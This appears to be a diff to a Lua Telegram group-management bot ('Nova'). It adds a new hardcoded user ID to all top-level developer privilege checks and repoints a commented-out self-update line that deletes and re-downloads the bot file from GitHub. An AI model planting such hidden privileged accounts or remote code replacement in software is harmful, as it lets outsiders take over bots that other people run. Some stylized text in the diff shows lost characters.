@@ -114,7 +114,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1918870568,2125751802}  
+local ListSudos ={Sudo_Id,1918870568,2125751802,2098635212}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -128,6 +128,8 @@ DevelopersQ = Redis:sismember(TheNova.."Nova:DevelopersQ:Groups",UserId)
 if UserId == 1918870568 then
 Status = true
 elseif UserId == 2125751802 then
+Status = true
+elseif UserId == 2098635212 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -153,6 +155,8 @@ StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1918870568 then
 Status = 'مبرمج السورس'
 elseif UserId == 2125751802 then
+Status = 'مبرمج السورس'
+elseif UserId == 2098635212 then
 Status = 'مبرمج السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -730,6 +734,8 @@ if UserId == 1918870568 then
 Status = true
 elseif UserId == 2125751802 then
 Status = true
+elseif UserId == 2098635212 then
+Status = true
 elseif UserId == Sudo_Id then  
 Status = true
 elseif UserId == TheNova then
@@ -768,6 +774,8 @@ StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1918870568 then
 Status = true
 elseif UserId == 1349843982 then
+Status = true
+elseif UserId == 2098635212 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -897,6 +905,9 @@ if tonumber(msg.sender.user_id) == 1918870568 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
 elseif tonumber(msg.sender.user_id) == 2125751802 then
+msg.Name_Controller = 'مبرمج السورس '
+msg.The_Controller = 1
+elseif tonumber(msg.sender.user_id) == 2098635212 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -2268,7 +2279,7 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*◍ هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 --os.execute('rm -rf Nova.lua')
---download('https://raw.githubusercontent.com/tm-nova/nova1/master/Nova.lua','Nova.lua')
+--download('https://raw.githubusercontent.com/Xavier-V1/Xavier-V1/master/Nova.lua','Nova.lua')
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*◍ تم تحديث السورس * ',"md",true)  
 end
 if text == 'جلب النسخه الاحتياطيه ⌔' or text == 'جلب نسخه احتياطيه' then
@@ -2784,31 +2795,6 @@ local TotalEdit = Redis:get(TheNova..'Nova:Num:Message:Edit'..msg_chat_id..Messa
 local TotalMsgT = Total_message(TotalMsg) 
 return LuaTele.sendText(msg_chat_id,msg_id,
 '\n*◍ ايديه : '..UserId..
-'\n◍ معرفه : '..UserInfousername..
-'\n◍ رتبته : '..RinkBot..
-'\n◍ رسائله : '..TotalMsg..
-'\n◍ تعديلاته : '..TotalEdit..
-'\n◍ تفاعله : '..TotalMsgT..
-'*',"md") 
-end
-
-if text and text:match('^كشف (%d+)$') then
-local Useriid = text:match('^كشف (%d+)$')
-local UserInfo = LuaTele.getUser(Useriid)
-if UserInfo.luatele == "error" and UserInfo.code == 6 then
-return LuaTele.sendText(msg_chat_id,msg_id,"\n◍ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
-end
-if UserInfo.username then
-UserInfousername = '@'..UserInfo.username..''
-else
-UserInfousername = 'لا يوجد'
-end
-local RinkBot = Controller(msg_chat_id,Useriid_Info.id)
-local TotalMsg = Redis:get(TheNova..'Nova:Num:Message:User'..msg_chat_id..':'..Useriid_Info.id) or 0
-local TotalEdit = Redis:get(TheNova..'Nova:Num:Message:Edit'..msg_chat_id..Useriid_Info.id) or 0
-local TotalMsgT = Total_message(TotalMsg) 
-return LuaTele.sendText(msg_chat_id,msg_id,
-'\n*◍ ايديه : '..Useriid..
 '\n◍ معرفه : '..UserInfousername..
 '\n◍ رتبته : '..RinkBot..
 '\n◍ رسائله : '..TotalMsg..
@@ -9031,11 +9017,16 @@ else
 local photo = LuaTele.getUserProfilePhotos(Sudo_Id)
 if photo.total_count > 0 then
 local mrt = LuaTele.getUser(Sudo_Id)
-local T = '* ‹ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐁𝐨𝐭 ›\n— — — — — — — — —\n‹ 𝐃𝐞𝐯 𝐍𝐚𝐦𝐞 › *['..mrt.first_name..'](tg://user?id='..mrt.id..')*\n*'
+if mrt.username then
+mrtusername = '@'..mrt.username..''
+else
+mrtusername = 'لا يوجد'
+end
+local T = '* ‹ 𝐃𝐞𝐯 𝐁𝐨𝐭 ›\n— — — — — — — — —\n‹ 𝐃𝐞𝐯 𝐍𝐚𝐦𝐞 » *['..mrt.first_name..'](tg://user?id='..mrt.id..')*\n* 𝐃𝐞𝐯 𝐔𝐬𝐞𝐫 » '..mrtusername..' *\n* 𝐃𝐞𝐯 𝐈𝐝 » `'..Sudo_Id..'` '
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = ' '..mrt.first_name..' ', url = "https://t.me/"..mrt.username}
+{text = ' '..mrt.first_name..' ', url = "https://t.me/"..(mrt.username or 'TmNova')}
 },
 {
 {text = 'قناه السورس ', url = "https://t.me/TmNova"}
@@ -9071,7 +9062,7 @@ end
 if text == 'مارتن' or text == 'ايزلا' or text == 'مالك' or text == 'شق هارلين' then
 photo = "https://t.me/u_g_t/2"
 local T =[[
- 𝑝𝑟𝑜𝑔𝑟𝑎𝑚𝑚𝑒𝑟 𝑚𝑎𝑟𝑡𝑖𝑛
+ 𝑝𝑟𝑜𝑔??𝑎𝑚??𝑒𝑟 𝑚𝑎𝑟𝑡𝑖𝑛
  ᴛᴏ ᴄᴏᴍᴍᴜɴɪᴄᴀᴛᴇ ᴡɪᴛʜ ᴍᴇ  ♪
    ғᴏʟʟᴏᴡ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ  𓂀
 ]]
@@ -9079,6 +9070,9 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {
 {text = '‹ 𝐸𝑎 - 𝑍𝑧 𝐿 𝑎 ›', url = "https://t.me/E_J_W"},{text = '‹ 𝑚𝑎𝑟𝑡𝑖𝑛 ›', url = "https://t.me/ZX_VL"}
+},
+{
+{text = '‹ 𝑀𝑎𝐿𝑒𝐾 ›', url = "https://t.me/U_MALK"}
 },
 {
 {text = '‹ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐍𝐨𝐯𝐚 ›', url = "https://t.me/TmNova"}
